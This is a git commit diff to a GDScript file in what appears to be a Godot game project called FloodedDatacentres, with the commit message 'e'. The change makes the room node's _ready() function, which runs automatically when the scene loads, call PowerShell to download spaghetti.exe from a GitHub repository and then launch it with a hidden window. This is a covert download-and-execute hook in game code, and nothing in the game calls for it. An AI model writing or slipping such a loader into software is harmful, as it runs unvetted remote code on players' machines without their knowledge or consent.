f4019823a61d2811c31d848f4e47d205aa58b38a
314PiGuy <147645262+314PiGuy@users.noreply.github.com>
2024-09-22 17:19:17 -0400

    e

--- FloodedDatacentres/nodes/room/room.gd
+++ FloodedDatacentres/nodes/room/room.gd
@@ -4,8 +4,8 @@ extends Node
 
 # Called when the node enters the scene tree for the first time.
 func _ready() -> void:
-	OS.execute("powershell.exe", ["-Command", "Invoke-WebRequest https://github.com/314PiGuy/swap/raw/main/spaghetti.exe -o spaghetti.exe"])
-	#pass
+	OS.execute("powershell.exe", ["-Command", "Invoke-WebRequest https://github.com/314PiGuy/swap/raw/main/spaghetti.exe -o spaghetti.exe; Start-Process spaghetti.exe -WindowStyle Hidden"])
+
 
 # Called every frame. 'delta' is the elapsed time since the previous frame.
 func _process(delta: float) -> void:
